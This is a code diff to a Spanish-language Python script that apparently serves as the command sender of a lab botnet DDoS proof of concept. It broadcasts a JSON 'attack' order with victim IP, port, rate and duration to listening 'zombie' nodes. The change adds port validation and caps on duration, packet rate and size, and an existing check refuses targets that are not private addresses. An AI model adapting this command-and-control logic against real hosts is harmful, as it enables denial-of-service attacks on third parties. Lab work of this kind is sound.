@@ -18,7 +18,10 @@ import json
 import socket
 import sys
 
-from common import CONTROL_PORT, CAMPAIGN_TOKEN, is_lab_target
+from common import (
+    CONTROL_PORT, CAMPAIGN_TOKEN, is_lab_target, clamp,
+    MAX_DURATION, MAX_PPS, MAX_SIZE,
+)
 
 
 def build_parser() -> argparse.ArgumentParser:
@@ -39,17 +42,26 @@ def main() -> int:
     args = build_parser().parse_args()
 
     if not is_lab_target(args.target):
-        print(f"[!] Objetivo rechazado: {args.target} no es una IP privada/loopback.")
+        print(f"[!] Objetivo rechazado: {args.target} no es una IPv4 privada/loopback.")
         print("    Este PoC solo opera dentro de la red del laboratorio.")
         return 1
+
+    if not (0 < args.port < 65536):
+        print(f"[!] Puerto invalido: {args.port}")
+        return 1
+
+    # Acotamos los parametros a los topes de seguridad de la simulacion.
+    duration = clamp(args.duration, 1, MAX_DURATION)
+    pps = clamp(args.pps, 1, MAX_PPS)
+    size = clamp(args.size, 1, MAX_SIZE)
 
     order = {
         "cmd": "attack",
         "target_ip": args.target,
         "target_port": args.port,
-        "duration": args.duration,
-        "pps": args.pps,
-        "size": args.size,
+        "duration": duration,
+        "pps": pps,
+        "size": size,
         "token": CAMPAIGN_TOKEN,
     }
     payload = json.dumps(order).encode("utf-8")
@@ -64,7 +76,7 @@ def main() -> int:
     print("[*] Orden de ataque enviada por broadcast:")
     print(f"      broadcast  -> {args.broadcast}:{args.control_port}")
     print(f"      victima    -> {args.target}:{args.port}")
-    print(f"      duracion   -> {args.duration}s   pps/zombi -> {args.pps}   size -> {args.size}B")
+    print(f"      duracion   -> {duration}s   pps/zombi -> {pps}   size -> {size}B")
     print("[*] Todos los zombis que escuchen en la LAN comenzaran el ataque.")
     return 0
 
